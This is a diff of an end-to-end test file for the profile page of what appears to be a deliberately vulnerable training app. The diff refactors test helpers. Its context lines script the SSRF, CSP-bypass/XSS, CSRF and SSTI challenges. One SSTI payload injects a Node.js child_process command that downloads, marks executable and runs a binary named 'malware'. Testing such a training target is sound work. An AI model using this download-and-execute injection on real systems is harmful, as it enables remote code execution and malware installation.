@@ -5,33 +5,35 @@
 
 import config = require('config')
 import { browser, by, element, protractor } from 'protractor'
+import { basePath, beforeEachLogin, expectChallengeSolved } from './e2eHelpers'
+
 const utils = require('../../lib/utils')
 
 describe('/profile', () => {
   let username, submitButton, url, setProfileImageButton
 
-  protractor.beforeEach.login({ email: `admin@${config.get('application.domain')}`, password: 'admin123' })
+  beforeEachLogin({ email: `admin@${config.get('application.domain')}`, password: 'admin123' })
 
   describe('challenge "ssrf"', () => {
     it('should be possible to request internal resources using image upload URL', () => {
       void browser.waitForAngularEnabled(false)
-      void browser.get(`${protractor.basePath}/profile`)
+      void browser.get(`${basePath}/profile`)
       url = element(by.id('url'))
       submitButton = element(by.id('submitUrl'))
       void url.sendKeys(`${browser.baseUrl}/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3`)
       void submitButton.click()
-      void browser.get(`${protractor.basePath}/`)
+      void browser.get(`${basePath}/`)
       void browser.driver.sleep(5000)
       void browser.waitForAngularEnabled(true)
     })
-    protractor.expect.challengeSolved({ challenge: 'SSRF' })
+    expectChallengeSolved({ challenge: 'SSRF' })
   })
 
   if (!utils.disableOnContainerEnv()) {
     describe('challenge "usernameXss"', () => {
       it('Username field should be susceptible to XSS attacks after disarming CSP via profile image URL', () => {
         void browser.waitForAngularEnabled(false)
-        void browser.get(`${protractor.basePath}/profile`)
+        void browser.get(`${basePath}/profile`)
 
         const EC = protractor.ExpectedConditions
         url = element(by.id('url'))
@@ -54,28 +56,28 @@ describe('/profile', () => {
         void url.sendKeys(`${browser.baseUrl}/assets/public/images/uploads/default.svg`)
         void setProfileImageButton.click()
         void browser.driver.sleep(5000)
-        void browser.get(`${protractor.basePath}/#/`)
+        void browser.get(`${basePath}/#/`)
         void browser.waitForAngularEnabled(true)
       })
-      protractor.expect.challengeSolved({ challenge: 'CSP Bypass' })
+      expectChallengeSolved({ challenge: 'CSP Bypass' })
     })
 
     describe('challenge "ssti"', () => {
       it('should be possible to inject arbitrary nodeJs commands in username', () => {
         void browser.waitForAngularEnabled(false)
-        void browser.get(`${protractor.basePath}/profile`)
+        void browser.get(`${basePath}/profile`)
         username = element(by.id('username'))
         submitButton = element(by.id('submit'))
         void username.sendKeys('#{global.process.mainModule.require(\'child_process\').exec(\'wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware\')}')
         void submitButton.click()
 
-        void browser.get(`${protractor.basePath}/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3`)
+        void browser.get(`${basePath}/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3`)
 
-        void browser.get(`${protractor.basePath}/`)
+        void browser.get(`${basePath}/`)
         void browser.driver.sleep(10000)
         void browser.waitForAngularEnabled(true)
       })
-      protractor.expect.challengeSolved({ challenge: 'SSTi' })
+      expectChallengeSolved({ challenge: 'SSTi' })
     })
   }
 
@@ -90,7 +92,7 @@ describe('/profile', () => {
       void browser.driver.sleep(5000)
       void browser.waitForAngularEnabled(true)
     })
-    // protractor.expect.challengeSolved({ challenge: 'CSRF' })
+    // expectChallengeSolved({ challenge: 'CSRF' })
 
     xit('should be possible to fake a CSRF attack against the user profile page', () => {
       void browser.waitForAngularEnabled(false)
@@ -114,6 +116,6 @@ describe('/profile', () => {
       void browser.driver.sleep(1000)
       void browser.waitForAngularEnabled(true)
     })
-    // protractor.expect.challengeSolved({ challenge: 'CSRF' })
+    // expectChallengeSolved({ challenge: 'CSRF' })
   })
 })
